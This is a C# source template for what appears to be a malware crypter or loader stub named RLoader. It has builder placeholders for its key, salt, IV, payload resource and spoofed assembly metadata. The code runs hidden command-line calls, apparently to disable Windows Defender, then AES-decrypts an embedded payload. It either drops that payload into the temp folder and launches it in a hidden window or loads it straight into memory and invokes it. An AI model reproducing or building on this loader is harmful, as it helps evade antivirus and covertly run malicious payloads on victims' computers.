using System;
using System.IO;
using System.Reflection;
using System.Security.Cryptography;
using System.Runtime.InteropServices;
using System.Text;
using System.Resources;
using System.Threading;
using System.Diagnostics;
using System.Runtime.InteropServices;
#if DefDebug
using System.Windows.Forms;
#endif

#if DefAssembly
[assembly: AssemblyTitle("%Title%")]
[assembly: AssemblyDescription("%Description%")]
[assembly: AssemblyCompany("%Company%")]
[assembly: AssemblyProduct("%Product%")]
[assembly: AssemblyCopyright("%Copyright%")]
[assembly: AssemblyTrademark("%Trademark%")]
[assembly: AssemblyFileVersion("%v1%" + "." + "%v2%" + "." + "%v3%" + "." + "%v4%")]
#endif

[assembly: Guid("%Guid%")]

public partial class RLoader
{
    public static void Main()
    {

#if DefKillWD
        try
        {
            Process.Start(new ProcessStartInfo
            {
                FileName = "cmd",
                Arguments = Encoding.ASCII.GetString(RAES_Method(Convert.FromBase64String("#KillWDCommands"))),
                WindowStyle = ProcessWindowStyle.Hidden,
                CreateNoWindow = true,
                UseShellExecute = false,
                RedirectStandardOutput = true
            });
        }
        catch (Exception ex)
        {
#if DefDebug
            MessageBox.Show("L1: " + Environment.NewLine + ex.ToString());
#endif
        }
#endif

        try
        {
            Thread.Sleep(startDelay * 1000);
        }
        catch (Exception ex)
        {
#if DefDebug
            MessageBox.Show("L2: " + Environment.NewLine + ex.ToString());
#endif
        }

        try
        {
#if DefKillWD
            File.WriteAllBytes(Path.Combine(Path.GetTempPath(), Encoding.ASCII.GetString(RAES_Method(Convert.FromBase64String("#DROPFILE")))), RAES_Method((byte[])new ResourceManager("#LoaderRes", Assembly.GetExecutingAssembly()).GetObject("#Program")));
            Process.Start(new ProcessStartInfo
            {
                FileName = "cmd",
                Arguments = "/c " + Path.Combine(Path.GetTempPath(), Encoding.ASCII.GetString(RAES_Method(Convert.FromBase64String("#DROPFILE")))) + " \"" + Assembly.GetEntryAssembly().Location + "\"",
                WorkingDirectory = Path.GetTempPath(),
                WindowStyle = ProcessWindowStyle.Hidden,
                CreateNoWindow = true,
            });
#else
            Assembly.Load(RAES_Method((byte[])new ResourceManager("#LoaderRes", Assembly.GetExecutingAssembly()).GetObject("#Program"))).EntryPoint.Invoke(null, new object[0]);
#endif        
        }
        catch (Exception ex)
        {
#if DefDebug
            MessageBox.Show("L3: " + Environment.NewLine + ex.ToString());
#endif
        }
    }

    public static byte[] RAES_Method(byte[] rarg1)
    {
        using (var mStream = new MemoryStream())
        {
            using (var cStream = new CryptoStream(mStream, new RijndaelManaged() { KeySize = 256, Mode = CipherMode.CBC }.CreateDecryptor(new Rfc2898DeriveBytes("#KEY", Encoding.ASCII.GetBytes("#SALT"), 100).GetBytes(16), Encoding.ASCII.GetBytes("#IV")), CryptoStreamMode.Write))
            {
                cStream.Write(rarg1, 0, rarg1.Length);
                cStream.Close();
            }
            return mStream.ToArray();
        }
    }
}